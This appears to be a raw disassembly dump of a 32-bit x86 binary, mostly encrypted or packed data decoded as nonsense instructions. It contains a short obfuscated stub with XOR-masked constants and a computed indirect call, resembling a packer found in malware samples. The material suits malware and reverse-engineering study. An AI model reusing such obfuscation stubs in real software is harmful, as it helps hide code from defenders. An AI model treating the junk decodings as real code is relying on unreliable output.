  408b8d:	jmp    0x408bcf
  408b8f:	aas    
  408b90:	dec    esi
  408b91:	xchg   BYTE PTR [edi],cl
  408b93:	mov    cl,0xd4
  408b95:	mov    ds:0xa2fdd064,eax
  408b9a:	inc    edx
  408b9b:	test   BYTE PTR [esi],ch
  408b9d:	int3   
  408b9e:	xlat   BYTE PTR ds:[ebx]
  408b9f:	lock adc eax,0x9b0ba354
  408ba5:	push   ebp
  408ba6:	(bad)  
  408ba7:	into   
  408ba8:	jns    0x408be8
  408baa:	jmp    0x403b:0x9e389395
  408bb1:	(bad)  
  408bb2:	fnsetpm(287 only) 
  408bb4:	xchg   esp,eax
  408bb5:	das    
  408bb6:	outs   dx,BYTE PTR ds:[esi]
  408bb7:	dec    esp
  408bb8:	ror    ebx,1
  408bba:	scas   al,BYTE PTR es:[edi]
  408bbb:	mov    al,ds:0xc605a5a5
  408bc0:	in     al,0xf7
  408bc2:	push   esp
  408bc3:	pusha  
  408bc4:	adc    BYTE PTR [eax-0x1a8dcd39],dh
  408bca:	loop   0x408b4e
  408bcc:	pop    edx
  408bcd:	dec    ecx
  408bce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bcf:	ins    DWORD PTR es:[edi],dx
  408bd0:	addr16 call 0x1dc:0xc17ed16e
  408bd8:	and    esi,DWORD PTR [ecx-0x5d1ea2d5]
  408bde:	es daa 
  408be0:	cmp    bh,BYTE PTR [esp+edx*2]
  408be3:	or     BYTE PTR [eax+0x7],ch
  408be6:	repnz dec ecx
  408be8:	jmp    0x86e210c8
  408bed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bee:	cmp    al,0x19
  408bf0:	and    dh,al
  408bf2:	push   ecx
  408bf3:	add    eax,0x68485700
  408bf8:	mov    cl,0xe8
  408bfa:	push   0xd
  408bfc:	adc    DWORD PTR [eax-0x2a],ebx
  408bff:	adc    bh,BYTE PTR [edi+esi*2]
  408c02:	dec    ebx
  408c03:	xchg   edx,eax
  408c04:	sub    BYTE PTR [esp+esi*8-0x441a3f6],0xad
  408c0c:	mov    eax,0x6c5db9b8
  408c11:	fisub  DWORD PTR ds:0xa38fafef
  408c17:	cmp    DWORD PTR [esi],edi
  408c19:	sbb    eax,0x51de03bd
  408c1e:	dec    esp
  408c1f:	jns    0x408c93
  408c21:	sti    
  408c22:	cmp    al,0x88
  408c24:	push   ecx
  408c25:	mov    edx,0x30066018
  408c2a:	lods   eax,DWORD PTR ds:[esi]
  408c2b:	fucomi st,st(4)
  408c2d:	pop    ebp
  408c2e:	in     eax,dx
  408c2f:	adc    dl,al
  408c31:	shl    DWORD PTR [esi],0x24
  408c34:	xchg   ecx,eax
  408c35:	mov    DWORD PTR [ebx+0x554e9a3f],ecx
  408c3b:	cmp    bh,BYTE PTR [ebx]
  408c3d:	aaa    
  408c3e:	mov    bl,BYTE PTR [ebp+0x3f]
  408c41:	out    0x7,al
  408c43:	jbe    0x408bf6
  408c45:	cwde   
  408c46:	jnp    0x408caf
  408c48:	mov    ds,WORD PTR [ecx+eiz*8-0x7e310ac7]
  408c4f:	mov    edx,0x7a64a174
  408c54:	jbe    0x408c4c
  408c56:	std    
  408c57:	pop    eax
  408c58:	sahf   
  408c59:	add    DWORD PTR ds:0x139b08f7,ecx
  408c5f:	mov    ecx,0xc037da25
  408c64:	pop    ds
  408c65:	xor    edi,DWORD PTR [ebx]
  408c67:	cli    
  408c68:	mov    ds:0xd270f141,eax
  408c6d:	nop
  408c6e:	das    
  408c6f:	aas    
  408c70:	xor    esp,DWORD PTR [ebx+0x2f644a98]
  408c76:	ins    DWORD PTR es:[edi],dx
  408c77:	sub    dh,BYTE PTR [ecx+eiz*2-0x209a53f5]
  408c7e:	mov    ah,0x3f
  408c80:	push   0xa24e29eb
  408c85:	mov    ch,0xe4
  408c87:	add    edi,ecx
  408c89:	pop    eax
  408c8a:	sahf   
  408c8b:	sbb    eax,0x384eb1a6
  408c90:	aas    
  408c91:	jmp    0x93881ffa
  408c96:	mov    eax,ds:0x86cffaef
  408c9b:	fwait
  408c9c:	das    
  408c9d:	inc    edx
  408c9e:	xlat   BYTE PTR ds:[ebx]
  408c9f:	xchg   esp,eax
  408ca0:	cs jo  0x408cbe
  408ca3:	xor    edx,DWORD PTR [edi+0x758605bd]
  408ca9:	shl    DWORD PTR [esi],0xd4
  408cac:	cwde   
  408cad:	leave  
  408cae:	adc    edx,DWORD PTR [ebx]
  408cb0:	pop    eax
  408cb1:	add    ah,BYTE PTR [ecx+eax*1-0x5]
  408cb5:	xchg   edx,eax
  408cb6:	rcl    DWORD PTR [ebp-0x5d503d5d],cl
  408cbc:	mov    esi,0x67ccaa22
  408cc1:	enter  0xea62,0x9c
  408cc5:	gs xor al,0xce
  408cc8:	repz adc ebx,DWORD PTR [eax]
  408ccb:	fsubr  st,st(4)
  408ccd:	rcr    BYTE PTR [edx],0xda
  408cd0:	aaa    
  408cd1:	mov    edi,0x88503392
  408cd6:	outs   dx,BYTE PTR ds:[esi]
  408cd7:	or     BYTE PTR ds:0x8a2682d5,bl
  408cdd:	add    eax,0x94b929f6
  408ce2:	addr16 jns 0x408ce5
  408ce5:	stc    
  408ce6:	clc    
  408ce7:	and    bl,dl
  408ce9:	inc    esi
  408cea:	mov    al,0xca
  408cec:	test   eax,0x4bb939a3
  408cf1:	sbb    al,0x8
  408cf3:	loop   0x408cce
  408cf5:	mov    al,0x1b
  408cf7:	push   edi
  408cf8:	xchg   edx,eax
  408cf9:	adc    al,0x79
  408cfb:	(bad)  
  408cfc:	jmp    0x8820:0x7a51a8f9
  408d03:	ror    DWORD PTR [edi],1
  408d05:	test   DWORD PTR [ecx-0x24],eax
  408d08:	(bad)  
  408d09:	dec    DWORD PTR [ebx+0x5e9c6]
  408d0f:	add    BYTE PTR [eax],al
  408d11:	mov    eax,0x3272db
  408d16:	mov    ebx,0x7510893
  408d1b:	mov    ecx,DWORD PTR [ebp-0x4]
  408d1e:	xor    ecx,ebx
  408d20:	add    ecx,eax
  408d22:	mov    DWORD PTR [ebp-0xc],ecx
  408d25:	mov    ebx,0x65655
  408d2a:	add    ebx,0x3234
  408d30:	xchg   ebx,esi
  408d32:	xor    ebx,ebx
  408d34:	push   esi
  408d35:	mov    esi,ebx
  408d37:	pop    ebx
  408d38:	mov    edx,esi
  408d3a:	add    ebx,0x1002
  408d40:	lea    eax,[ebp-0x10]
  408d43:	add    edx,eax
  408d45:	add    edx,0x5
  408d48:	push   edx
  408d49:	inc    esi
  408d4a:	pop    ecx
  408d4b:	dec    ecx
  408d4c:	xchg   ecx,eax
  408d4d:	dec    eax
  408d4e:	xchg   ecx,eax
  408d4f:	dec    ecx
  408d50:	xchg   ecx,edx
  408d52:	dec    edx
  408d53:	push   edx
  408d54:	mov    edx,ebx
  408d56:	pop    ebx
  408d57:	dec    ebx
  408d58:	call   DWORD PTR [ebx]
  408d5a:	cmp    DWORD PTR [ebp+0x10],esi
  408d5d:	je     0x408d7c
  408d63:	xchg   edx,eax
  408d64:	push   0xb
  408d66:	pop    ecx
  408d67:	push   0x4
  408d69:	pop    ebx
  408d6a:	inc    ebx
  408d6b:	xchg   ebx,ecx
  408d6d:	sub    ebx,ecx
  408d6f:	xchg   ebx,ecx
  408d71:	dec    ecx
  408d72:	dec    ecx
  408d73:	mov    eax,DWORD PTR [ebp-0x1c]
  408d76:	imul   eax,ecx
  408d79:	add    esp,eax
  408d7b:	xchg   edx,eax
  408d7c:	push   eax
  408d7d:	xor    ebx,ebx
  408d7f:	mov    edx,esp
  408d81:	dec    edx
  408d82:	inc    ebx
  408d83:	add    ebx,DWORD PTR [edx+ebx*1]
  408d86:	dec    ebx
  408d87:	xor    edx,edx
  408d89:	add    DWORD PTR [ebp-0xc],ebx
  408d8c:	pop    ebx
  408d8d:	mov    eax,DWORD PTR [ebp-0xc]
  408d90:	pop    edi
  408d91:	pop    esi
  408d92:	pop    ebx
  408d93:	leave  
  408d94:	ret    0x10
  408d97:	push   ebp
  408d98:	mov    ebp,esp
  408d9a:	push   ecx
  408d9b:	xor    ecx,ecx
  408d9d:	xor    ecx,DWORD PTR ds:0x42600c
  408da3:	and    DWORD PTR ds:0x426014,ecx
  408da9:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  408db0:	mov    eax,DWORD PTR [ebp-0x4]
  408db3:	sub    edx,edx
  408db5:	mov    edx,DWORD PTR [ebp+0x10]
  408db8:	and    DWORD PTR ds:0x427014,ebx
  408dbe:	mov    ecx,0x7510893
  408dc3:	xor    eax,ecx
  408dc5:	add    eax,0x3272db
  408dca:	mov    DWORD PTR [edx],eax
  408dcc:	mov    DWORD PTR ds:0x426008,0x4f8c
  408dd6:	mov    eax,DWORD PTR [ebp+0xc]
  408dd9:	sbb    DWORD PTR ds:0x425020,0x2880
  408de3:	xor    eax,ecx
  408de5:	and    DWORD PTR ds:0x429008,0x0
  408def:	mov    edx,DWORD PTR ds:0x429008
  408df5:	inc    edx
  408df6:	mov    DWORD PTR ds:0x429008,edx
  408dfc:	cmp    DWORD PTR ds:0x429008,0x17
  408e03:	jne    0x408e19
  408e09:	push   0x41ff61
  408e0e:	push   0x391b
  408e13:	call   DWORD PTR ds:0x421008
  408e19:	cmp    DWORD PTR ds:0x429008,0x15
  408e20:	jb     0x408def
  408e26:	xor    DWORD PTR ds:0x42700c,edi
  408e2c:	push   esi
  408e2d:	mov    esi,DWORD PTR [ebp+0x10]
  408e30:	mov    edx,0x3272db
  408e35:	add    eax,edx
  408e37:	mov    DWORD PTR [esi+0x4],eax
  408e3a:	mov    eax,DWORD PTR [ebp+0x14]
  408e3d:	mov    esi,DWORD PTR [ebp+0x10]
  408e40:	mov    DWORD PTR [esi+0x8],eax
  408e43:	jmp    0x40b197
  408e48:	push   ebp
  408e49:	add    al,0x4c
  408e4b:	mov    al,ds:0x6365b8eb
  408e50:	add    eax,0x553327cf
  408e55:	push   ss
  408e56:	test   eax,0x62198a76
  408e5b:	bound  ebp,QWORD PTR [ebx]
  408e5d:	pop    edi
  408e5e:	bound  esp,QWORD PTR [edx-0x7a]
  408e61:	div    DWORD PTR [ebp+0x77f2c23d]
  408e67:	fidiv  WORD PTR [ebx+edx*1]
  408e6a:	sbb    eax,0x74c836d5
  408e6f:	mov    ecx,0x29d34040
  408e74:	xlat   BYTE PTR ds:[ebx]
  408e75:	in     eax,0xc2
  408e77:	repz xchg ebp,eax
  408e79:	jge    0x408e8a
  408e7b:	inc    edx
  408e7c:	aad    0x2c
  408e7e:	push   edx
  408e7f:	sbb    ebp,esi
  408e81:	and    esp,esp
  408e83:	and    al,0xb9
  408e86:	xchg   ebx,eax
  408e87:	cmp    al,0x61
  408e89:	cmp    al,0x5d
  408e8b:	pop    ecx
  408e8c:	imul   ecx,DWORD PTR [ecx+0x1c],0xffffffad
  408e90:	dec    ebx
  408e91:	xchg   esp,eax
  408e92:	sbb    DWORD PTR [ebp-0x5452cc19],edx
  408e98:	clc    
  408e99:	mov    DWORD PTR [esi+0x7bd10728],eax
  408e9f:	add    bh,BYTE PTR [esi-0x61]
  408ea2:	sub    eax,DWORD PTR [edi]
  408ea4:	jl     0x408eca
  408ea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ea7:	push   esi
  408ea8:	add    ch,ah
  408eaa:	xchg   ah,al
  408eac:	fmul   st,st(1)
  408eae:	stos   BYTE PTR es:[edi],al
  408eaf:	cld    
  408eb0:	xchg   DWORD PTR [eax+0x53],esi
  408eb3:	add    ebx,edi
  408eb5:	punpcklwd mm6,DWORD PTR [edi+eax*8]
  408eb9:	push   es
  408eba:	dec    ebx
  408ebb:	sbb    eax,0x5ca3faed
  408ec0:	mov    eax,0xc8e4a907
  408ec5:	lods   eax,DWORD PTR ds:[esi]
  408ec6:	scas   al,BYTE PTR es:[edi]
  408ec7:	out    dx,al
  408ec8:	and    BYTE PTR [ebp-0x56],bh
  408ecb:	add    BYTE PTR [edi-0x3c81cb76],al
  408ed1:	jnp    0x408e73
  408ed3:	mov    edx,0xcf494900
  408ed8:	das    
  408ed9:	mov    es,WORD PTR [edx-0x59]
  408edc:	ss sbb al,0x17
  408edf:	push   0x41
  408ee1:	mov    edx,0x9058006b
  408ee6:	adc    ah,ah
  408ee8:	xchg   edi,eax
  408ee9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408eea:	es pop es
  408eec:	dec    ebp
  408eed:	fisubr DWORD PTR [esi+ecx*1]
  408ef0:	sub    eax,0x35ff1e26
  408ef5:	(bad)  
  408ef6:	cmp    esi,edi
  408ef8:	cmp    BYTE PTR [esp+ebx*2+0x78],dl
  408efc:	sub    eax,0xe75915f3
  408f01:	mov    edi,0x5844355b
  408f06:	loop   0x408f41
  408f08:	dec    edx
  408f09:	ins    BYTE PTR es:[edi],dx
  408f0a:	repnz lahf 
  408f0c:	jno    0x408f2d
  408f0e:	inc    edi
  408f0f:	aaa    
  408f10:	dec    esp
  408f11:	and    ch,BYTE PTR [eax]
  408f13:	xor    ebp,ebp
  408f15:	fild   WORD PTR [ecx]
  408f17:	dec    edi
  408f18:	push   eax
  408f19:	sbb    DWORD PTR [ebx],eax
  408f1b:	and    BYTE PTR [edx],bh
  408f1d:	stos   BYTE PTR es:[edi],al
  408f1e:	cmc    
  408f1f:	aaa    
  408f20:	in     eax,dx
  408f21:	stos   BYTE PTR es:[edi],al
  408f22:	pusha  
  408f23:	outs   dx,BYTE PTR ds:[esi]
  408f24:	gs inc esp
  408f26:	test   DWORD PTR [edx],ebp
  408f28:	sbb    eax,DWORD PTR [ecx+eiz*8-0x2aad7311]
  408f2f:	iret   
  408f30:	jl     0x408efa
  408f32:	xchg   ebx,eax
  408f33:	dec    ebx
  408f34:	repz add esp,DWORD PTR [ebp+0x42]
  408f38:	mov    cl,BYTE PTR [eax-0x187662e8]
  408f3e:	jg     0x408f83
  408f40:	call   0xf5b8cc18
  408f45:	add    DWORD PTR [edx-0x4b],edx
  408f48:	repz pop eax
  408f4a:	dec    edx
  408f4b:	fmulp  st(3),st
  408f4d:	dec    ax
  408f4f:	dec    ebx
  408f50:	bound  ecx,QWORD PTR [ebx]
  408f52:	xor    eax,0xb572bd59
  408f57:	out    0xb6,eax
  408f59:	sbb    BYTE PTR [esi],al
  408f5b:	sub    BYTE PTR [ecx],bh
  408f5d:	daa    
  408f5e:	jns    0x408fd0
  408f60:	jnp    0x408f4b
  408f62:	ud1    esp,DWORD PTR [edi+ecx*2-0x76]
  408f67:	pop    es
  408f68:	test   eax,0xddd16fae
  408f6d:	mov    eax,0x97071611
  408f72:	push   eax
  408f73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f74:	int    0x1b
  408f76:	rcl    DWORD PTR cs:0x7e4da517,1
  408f7d:	sti    
  408f7e:	aaa    
  408f7f:	jge    0x408f15
  408f81:	sbb    ebp,DWORD PTR [edx-0x57]
  408f84:	fwait
  408f85:	data16 ja 0x408f56
  408f88:	sub    edi,DWORD PTR [edi-0x48]
  408f8b:	and    eax,0x6889f4f5
  408f90:	les    eax,FWORD PTR [eax]
  408f92:	xor    esp,DWORD PTR [esi]
  408f94:	jb     0x408f37
  408f96:	sahf   
  408f97:	leave  
  408f98:	and    BYTE PTR [ebp-0x23],ah
  408f9b:	xchg   ebx,eax
  408f9c:	or     DWORD PTR [ebp-0x5d8cfe3e],eax
  408fa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fa3:	mov    esi,0xe3728220
  408fa8:	dec    BYTE PTR [ecx+edi*1+0x1e]
  408fac:	inc    ebp
  408fad:	adc    DWORD PTR [esi-0x79c350d6],ebp
  408fb3:	popf   
  408fb4:	out    0xe6,eax
  408fb6:	enter  0x1dd9,0x13
  408fba:	(bad)  
  408fbb:	out    dx,eax
  408fbc:	call   0x50a7f278
  408fc1:	xchg   DWORD PTR [esi-0x17],ecx
  408fc4:	pop    ebp
  408fc5:	ror    BYTE PTR [esi+0x7a],0xb6
  408fc9:	daa    
  408fca:	push   ds
  408fcb:	jl     0x409039
  408fcd:	mov    cl,0x81
  408fcf:	dec    ebp
  408fd0:	xor    BYTE PTR [edx+ebp*4-0x6f8add0],dh
  408fd7:	les    eax,FWORD PTR [edi+0x2de46754]
  408fdd:	pop    edx
  408fde:	mov    eax,0x88189ef8
  408fe3:	jl     0x40905b
  408fe5:	es sbb al,0xfb
  408fe8:	and    DWORD PTR [ebx-0x67],ecx
  408feb:	or     al,0xa3
  408fed:	mov    al,0xb5
  408fef:	call   0x5161f295
  408ff4:	dec    ecx
  408ff5:	(bad)  [ebp-0x53]
  408ff8:	mov    ah,0x43
  408ffa:	sbb    BYTE PTR [eax],dl
  408ffc:	pop    ds
  408ffd:	movups xmm4,XMMWORD PTR [esi+edx*8]
  409001:	pop    ebx
  409002:	adc    ch,dl
  409004:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409005:	ss pushf 
  409007:	pop    ss
  409008:	loopne 0x409067
  40900a:	or     ebx,DWORD PTR [edx+0x2660237b]
  409010:	adc    bl,BYTE PTR [edx+eax*1+0x49]
  409014:	jmp    DWORD PTR [eax]
  409016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409017:	pop    ebx
  409018:	dec    esi
  409019:	imul   ebp,DWORD PTR [esi+0x436161a4],0xffffffef
  409020:	xchg   DWORD PTR [edx+0x32],esp
  409023:	imul   esp,DWORD PTR [ecx-0x65],0xbfc9ca6c
  40902a:	push   esi
  40902b:	stc    
  40902c:	inc    ebp
  40902d:	das    
  40902e:	outs   dx,BYTE PTR ds:[esi]
  40902f:	mov    ebp,0x6771af0c
  409034:	ffreep st(2)
  409036:	mov    dl,0x1f
  409038:	(bad)  
  409039:	mov    dh,0x6a
  40903b:	lahf   
  40903c:	test   al,0xf
  40903e:	gs xor eax,0xd65ef43c
  409044:	inc    ebx
  409045:	mov    dl,0x66
  409047:	sbb    esp,DWORD PTR [ecx-0x24]
  40904a:	inc    edi
  40904b:	jno    0x409095
  40904d:	(bad)  
  40904e:	push   edi
  40904f:	pusha  
  409050:	xor    eax,0x737f036c
  409055:	fidivr DWORD PTR [ebx+eax*8+0x32d9335b]
  40905c:	and    eax,0x41183269
  409061:	mov    esp,0xd6065ada
  409066:	pop    ds
  409067:	mov    dl,0xc0
  409069:	lock push eax
  40906b:	test   BYTE PTR [ebp-0x49dc6e7c],dl
  409071:	test   eax,0xec78a313
  409076:	bound  edx,QWORD PTR [esi]
  409078:	loopne 0x4090ee
  40907a:	fstp   TBYTE PTR [ebp-0x4e]
  40907d:	xlat   BYTE PTR ds:[ebx]
  40907e:	mov    bl,0xfa
  409080:	(bad)  gs:[edx]
  409083:	(bad)  
  409084:	cmc    
  409085:	into   
  409086:	jle    0x409044
  409088:	call   0x30e9:0x19b1b516
  40908f:	das    
  409090:	ja     0x40906a
  409092:	pop    edx
  409093:	dec    edx
  409094:	call   DWORD PTR [ebx+0x31d1e626]
  40909a:	(bad)  
  40909b:	jle    0x409063
  40909d:	ror    al,0x38
  4090a0:	and    BYTE PTR [ecx+0x23],ch
  4090a3:	repnz pop ds
  4090a5:	in     eax,0x79
  4090a7:	jl     0x4090c9
  4090a9:	nop
  4090aa:	jo     0x40909c
  4090ac:	jmp    0x1a8728ba
  4090b1:	push   esi
  4090b2:	add    eax,edi
  4090b4:	das    
  4090b5:	jnp    0x4090fa
  4090b7:	idiv   BYTE PTR [ebx-0xc188d32]
  4090bd:	lock (bad) 
  4090bf:	sar    DWORD PTR [ebx+0x61ec15eb],1
  4090c5:	test   BYTE PTR [edi],dh
  4090c7:	sbb    ebp,esp
  4090c9:	ret    0xfa
  4090cc:	mov    esp,0xa4f7ade3
  4090d1:	mov    dh,0xfb
  4090d3:	add    esi,0x5c
  4090d6:	scas   eax,DWORD PTR es:[edi]
  4090d7:	loope  0x4090dc
  4090d9:	data16 lods al,BYTE PTR ds:[esi]
  4090db:	or     eax,0x376cca41
  4090e0:	dec    eax
  4090e1:	pusha  
  4090e2:	je     0x4090c6
  4090e4:	cmp    eax,0x9419638c
  4090e9:	hlt    
  4090ea:	in     al,dx
  4090eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090ec:	xor    esp,edx
  4090ee:	mov    ds:0x558c13fa,al
  4090f3:	adc    al,0xf9
  4090f5:	inc    ecx
  4090f6:	(bad)  
  4090f7:	mov    ecx,0x7e7e4068
  4090fc:	push   ebp
  4090fd:	(bad)  
  4090fe:	aaa    
  4090ff:	adc    ebp,DWORD PTR [edi-0x5d]
  409102:	push   edx
  409103:	in     eax,0xbc
  409105:	sbb    BYTE PTR [edx+0x56869c33],dl
  40910b:	lock xchg ch,bl
  40910e:	test   al,0x8d
  409110:	stos   BYTE PTR es:[edi],al
  409111:	add    al,0x29
  409113:	loop   0x4090aa
  409115:	push   ebp
  409116:	fmul   QWORD PTR [ebp+0x40]
  409119:	and    al,0x65
  40911b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40911c:	loope  0x409125
  40911e:	inc    edx
  40911f:	in     eax,0x0
  409121:	cmp    ah,BYTE PTR [edi]
  409123:	in     al,0xca
  409125:	stos   BYTE PTR es:[edi],al
  409126:	dec    eax
  409127:	push   esp
  409128:	sbb    BYTE PTR ds:[bx+si],ah
  40912c:	inc    esp
  40912d:	or     DWORD PTR [ecx],0xae26762f
  409133:	adc    DWORD PTR [ebx-0x35],0xffffffc9
  409137:	rcr    BYTE PTR [ebx],1
  409139:	pop    ss
  40913a:	stos   DWORD PTR es:[edi],eax
  40913b:	and    edi,esp
  40913d:	(bad)  
  40913e:	call   0xc79bfc92
  409143:	hlt    
  409144:	das    
  409145:	imul   edx,DWORD PTR [edi+esi*4],0xffffffad
  409149:	pop    esi
  40914a:	mov    ebp,0x8a34298f
  40914f:	mov    ah,0x3
  409151:	cmp    dl,BYTE PTR [ebx+0x56]
  409154:	ja     0x409198
  409156:	jo     0x4091c6
  409158:	cmp    BYTE PTR [eax+0x47e0f338],cl
  40915e:	fidiv  WORD PTR [esi-0x68016e47]
  409164:	sbb    al,0x67
  409166:	push   ss
  409167:	enter  0xc529,0xce
  40916b:	and    al,0x28
  40916d:	not    BYTE PTR [ecx+0x57]
  409170:	or     eax,0x19c2e602
  409175:	sbb    ch,al
  409177:	adc    al,0x6c
  409179:	lods   eax,DWORD PTR ds:[esi]
  40917a:	push   ds
  40917b:	mov    dh,0xc3
  40917d:	mov    ch,BYTE PTR [edx]
  40917f:	loop   0x4091a1
  409181:	loope  0x40915e
  409183:	lahf   
  409184:	out    dx,al
  409185:	xchg   ebx,eax
  409186:	hlt    
  409187:	adc    eax,0xaf1e9d8a
  40918c:	ror    BYTE PTR [ecx],0x9a
  40918f:	shr    DWORD PTR [edx+ebx*2],cl
  409192:	mov    DWORD PTR [ebp+0x51fb3cd2],0xafb937da
  40919c:	fist   DWORD PTR ds:0x781c7c8b
  4091a2:	arpl   WORD PTR [eax],bx
  4091a4:	cmp    dl,BYTE PTR [ebx+0x21cbf62c]
  4091aa:	jge    0x409228
  4091ac:	in     eax,0xd5
  4091ae:	test   al,0xcf
  4091b0:	push   esi
  4091b1:	jp     0x4091a2
  4091b3:	push   esi
  4091b4:	(bad)  
  4091b5:	sti    
  4091b6:	int3   
  4091b7:	imul   ebx,ebp,0x45e1c607
  4091bd:	mov    BYTE PTR [ecx],al
  4091bf:	jle    0x40916a
  4091c1:	aam    0xc6
  4091c3:	js     0x4091da
  4091c5:	inc    esp
  4091c6:	je     0x4091b8
  4091c8:	in     al,dx
  4091c9:	scas   eax,DWORD PTR es:[edi]
  4091ca:	stc    
  4091cb:	push   0xffffffda
  4091cd:	jl     0x4091fe
  4091cf:	idiv   BYTE PTR [edx+0x3d]
  4091d2:	sbb    BYTE PTR [eax+0x24],0x90
  4091d6:	stos   DWORD PTR es:[edi],eax
  4091d7:	sub    bl,BYTE PTR [edi]
  4091d9:	lods   eax,DWORD PTR ds:[esi]
  4091da:	push   ss
  4091db:	sbb    al,0x16
  4091dd:	fmul   st,st(0)
  4091df:	js     0x40922b
  4091e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091e2:	sbb    ah,bl
  4091e4:	sub    BYTE PTR [eax+ebp*4-0x67],bh
  4091e8:	(bad)  
  4091e9:	in     eax,dx
  4091ea:	rcr    BYTE PTR [ebp-0x18e97b64],cl
  4091f0:	adc    dh,BYTE PTR [ebp+0x68]
  4091f3:	sbb    BYTE PTR [ebp+0x1d],al
  4091f6:	out    0xbb,eax
  4091f8:	or     eax,0xe73d2380
  4091fd:	fsubr  QWORD PTR [edx-0x40]
  409200:	mov    edx,0x3a15b6db
  409205:	jne    0x4091bd
  409207:	clc    
  409208:	aam    0x20
  40920a:	jge    0x4091bc
  40920c:	inc    ecx
  40920d:	push   0xf5f99e24
  409212:	dec    ecx
  409213:	ins    BYTE PTR es:[edi],dx
  409214:	cwde   
  409215:	sub    ch,BYTE PTR [edi]
  409217:	mov    ch,0x46
  409219:	scas   eax,DWORD PTR es:[edi]
  40921a:	pop    eax
  40921b:	xchg   ecx,eax
  40921c:	iret   
  40921d:	sub    esp,edx
  40921f:	stc    
  409220:	fs mov al,0xec
  409223:	mov    dl,0x74
  409225:	lods   eax,DWORD PTR ds:[esi]
  409226:	jnp    0x40921a
  409228:	fwait
  409229:	mov    ebx,0xb02223b3
  40922e:	sbb    edx,edx
  409230:	mov    bl,0x2d
  409232:	dec    ebp
  409233:	aas    
  409234:	scas   al,BYTE PTR es:[edi]
  409235:	mov    WORD PTR [esi],cs
  409237:	pop    ecx
  409238:	imul   edx,esi,0xe52e6fdb
  40923e:	jb     0x409298
  409240:	jmp    0x4091df
  409242:	outs   dx,DWORD PTR ds:[esi]
  409243:	add    DWORD PTR [edx],ebx
  409245:	ins    DWORD PTR es:[edi],dx
  409246:	sahf   
  409247:	inc    ecx
  409248:	sbb    DWORD PTR [eax+0x4d],0x32580a65
  40924f:	add    BYTE PTR [edx],cl
  409251:	(bad)  
  409252:	das    
  409253:	jb     0x40927b
  409255:	xor    eax,0x7d81ee4c
  40925a:	push   ebx
  40925b:	pop    edx
  40925c:	mov    ebp,DWORD PTR [esi+0x1b11c5ab]
  409262:	pop    ebx
  409263:	jl     0x409264
  409265:	xchg   esp,eax
  409266:	aaa    
  409267:	mov    dh,0x26
  409269:	cmp    al,0xd2
  40926b:	aad    0xcd
  40926d:	mov    esi,0x87c0ed11
  409272:	jl     0x4092d4
  409274:	push   0xaf6e4d3c
  409279:	js     0x409226
  40927b:	mov    ds:0x6bb404c,eax
  409280:	iret   
  409281:	and    eax,0xe70b7467
  409286:	sbb    BYTE PTR [esi-0x50943f01],dh
  40928c:	(bad)  
  40928d:	push   ss
  40928e:	je     0x40921a
  409290:	dec    edi
  409291:	adc    ah,BYTE PTR [eax+0x7]
  409294:	mov    ebx,0xcc41759a
  409299:	jns    0x409247
  40929b:	rcl    bl,0xb7
  40929e:	push   eax
  40929f:	cld    
  4092a0:	sub    al,0x94
  4092a2:	ins    DWORD PTR es:[edi],dx
  4092a3:	add    DWORD PTR [esi+ebp*8-0x59f3c46f],edi
  4092aa:	or     ebx,DWORD PTR [ecx]
  4092ac:	enter  0x3831,0xe1
  4092b0:	std    
  4092b1:	and    ebp,esi
  4092b3:	scas   eax,DWORD PTR es:[edi]
  4092b4:	push   edx
  4092b5:	jmp    0x450:0x5432badf
  4092bc:	jbe    0x409260
  4092be:	cdq    
  4092bf:	mov    al,ds:0x6df6a000
  4092c4:	retf   
  4092c5:	mov    esi,DWORD PTR [ecx+0x2b181b1d]
  4092cb:	aaa    
  4092cc:	scas   eax,DWORD PTR es:[edi]
  4092cd:	fcom   QWORD PTR [ecx-0x1f]
  4092d0:	mov    bl,0x43
  4092d2:	mov    ecx,0x65e4eec2
  4092d7:	inc    ebx
  4092d8:	cld    
  4092d9:	xor    ebp,0x2c
  4092dc:	xchg   esp,eax
  4092dd:	int    0xac
  4092df:	sti    
  4092e0:	aad    0xc7
  4092e2:	mov    al,0x20
  4092e4:	test   al,0xea
  4092e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092e7:	aas    
  4092e8:	adc    cl,BYTE PTR [edx+0x6a77e492]
  4092ee:	shr    BYTE PTR [eax-0xd],1
  4092f1:	aas    
  4092f2:	add    al,ch
  4092f4:	mov    al,ds:0x9d23db8
  4092f9:	push   ss
  4092fa:	cmp    DWORD PTR [ebx],ecx
  4092fc:	(bad)  
  4092fd:	in     eax,dx
  4092fe:	call   0xd90eea60
  409303:	mov    WORD PTR [eax+0x16fcea2f],ds
  409309:	sub    eax,0x406ad7cd
  40930e:	sbb    DWORD PTR [edi+0x6b],0xfffffff3
  409312:	mov    ch,0x8
  409314:	clc    
  409315:	add    eax,0xe36cdc59
  40931a:	and    bl,dl
  40931c:	stos   BYTE PTR es:[edi],al
  40931d:	data16 aaa 
  40931f:	xchg   edx,eax
  409320:	lea    edx,[edx+0x4eaa1938]
  409326:	fsubr  QWORD PTR [ebx-0x2c203e12]
  40932d:	pop    ebx
  40932e:	cmp    al,0xff
  409330:	out    0xfa,al
  409332:	push   ebp
  409333:	mov    bh,0xc4
  409335:	in     al,dx
  409336:	mov    ebp,0x21400f03
  40933b:	(bad)  
  40933c:	enter  0x6629,0x5
  409340:	pop    edi
  409341:	and    ebx,DWORD PTR [ebp-0x24913efd]
  409347:	mov    eax,0x3b3de07a
  40934c:	ficomp WORD PTR [ecx-0x50]
  40934f:	jmp    0x944d:0xab82620d
  409356:	add    esi,ebp
  409358:	push   eax
  409359:	mov    bh,BYTE PTR [ecx+0x34a4a8cf]
  40935f:	call   0x8552:0xd22fbd13
  409366:	fidiv  DWORD PTR [eax+edi*2-0x13]
